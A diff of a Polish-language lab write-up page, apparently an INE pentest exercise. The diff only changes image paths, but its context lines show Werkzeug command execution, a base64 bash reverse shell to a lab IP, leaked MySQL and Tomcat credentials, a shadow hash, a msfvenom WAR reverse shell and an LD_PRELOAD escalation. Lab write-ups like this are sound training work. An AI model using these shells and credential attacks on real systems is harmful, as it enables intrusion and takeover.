@@ -270,22 +270,22 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
 MAC Address: 02:42:C0:FF:BF:03 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
 </code></pre></div><p>Podobnie jak w poprzednim boxie, mamy tutaj Werkzeug. Tym razem nie jest zabezpieczony pinem. Można zatem spróbować od razu z Command Execution. <code>__import__('os').popen('whoami').read();</code>. Jak widać pomyślnie.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621131535.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621131535.png" alt=""  />
 </p>
 <p>Pierwsza maszyna poszła bardzo sprawnie.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# echo <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.211.54.2/9001 0&gt;&amp;1&#34;&#39;</span>|base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo<span style="color:#f92672">=</span>
 </code></pre></div><p><code>__import__('os').popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo= | base64 -d | bash').read();</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621131905.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621131905.png" alt=""  />
 </p>
 <p>Nie widać na systemie żadnej flagi, ale sprawdziłem folder <code>/home</code>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621152931.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621152931.png" alt=""  />
 </p>
 <p>Nietypowo dużo użytkowników. Sprawdziłem również pliki. Tylko użytkownik <code>auditor</code> ma <code>.bash_history</code>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621153126.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621153126.png" alt=""  />
 </p>
 <p>Okazało się, że <code>.bash_history</code> zawiera ciekawą linię zawierającą dane o drugim hoście.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621153319.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621153319.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -h 192.238.232.4 -u root -p fArFLP29UySm4bZj
 </code></pre></div><hr>
@@ -312,10 +312,10 @@ MAC Address: 02:42:C0:D3:36:04 <span style="color:#f92672">(</span>Unknown<span 
 <span style="color:#66d9ef">use</span> mysql;
 <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
 <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span>;
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621155336.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621155336.png" alt=""  />
 </p>
 <p>Doczytałem, że mając dostęp do bazy <code>MySQL</code>, można spróbować wysłać payload m.in. przez <code>Metasploit</code> oraz moduł <code>exploit/multi/mysql/mysql_udf_payload</code>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621165435.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621165435.png" alt=""  />
 </p>
 <p>flag
 <code>4c537c0dfd18bafdcd59f53c7015550e</code></p>
@@ -340,11 +340,11 @@ PORT     STATE SERVICE VERSION
 MAC Address: 02:42:C0:FF:BF:05 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div><p>Zatem na porcie <code>8080</code> mamy <code>Apache Tomcat 8.0.53</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621142726.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621142726.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621143254.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621143254.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621143038.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621143038.png" alt=""  />
 </p>
 <p>Bardzo pomocny jest poradnik od <code>hacktricks</code>.
 <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat</a></p>
@@ -352,23 +352,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>Kolejny punkt to sprawdzenie bruteforcem.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole
 use auxiliary/scanner/http/tomcat_mgr_login
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621165709.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621165709.png" alt=""  />
 </p>
 <p><code>tomcat:s3cret</code></p>
 <p>I jest dostęp do panelu Tomcata.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621165928.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621165928.png" alt=""  />
 </p>
 <p>W tym momencie można uzyskać shell jako <code>tomcat</code> poprzez deploy pliku .war</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.238.232.2 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9090</span> -f war -o revshell.war
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621170743.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621170743.png" alt=""  />
 </p>
 <p><code>http://server3.ine.local:8080/revshell/</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621170833.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621170833.png" alt=""  />
 </p>
 <p>flag1
 <code>EBCFE35ACC27E0EA91CF3A5AB600BABE</code></p>
 <p>Ponadto zdaje się, że &ldquo;jesteśmy&rdquo; w kontenerze <code>Dockera</code>.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621171146.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621171146.png" alt=""  />
 </p>
 <p>Mamy na boxie użytkownika <code>robert</code> a co najciekawsze, mamy prawo odczytu do pliku <code>/etc/shadow</code></p>
 <p>`robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::</p>
@@ -394,7 +394,7 @@ find .
         &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robert&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robert@1234567890!@#&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-gui,admin-gui&#34;</span>/&gt;
 &lt;/tomcat-users&gt;
 </code></pre></div><p><code>robert:robert@1234567890!@#</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621180422.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621180422.png" alt=""  />
 </p>
 <p>flag2
 <code>EC2986081E84BB845541D5CC0BEE13B3</code></p>
@@ -411,7 +411,7 @@ Matching Defaults entries <span style="color:#66d9ef">for</span> robert on serve
 User robert may run the following commands on server3.ine.local:
     <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /bin/ls
 </code></pre></div><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220621181341.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220621181341.png" alt=""  />
 </p>
 <p>flag3
 <code>560648FC63F090A8CF776326DC13FAC7</code></p>
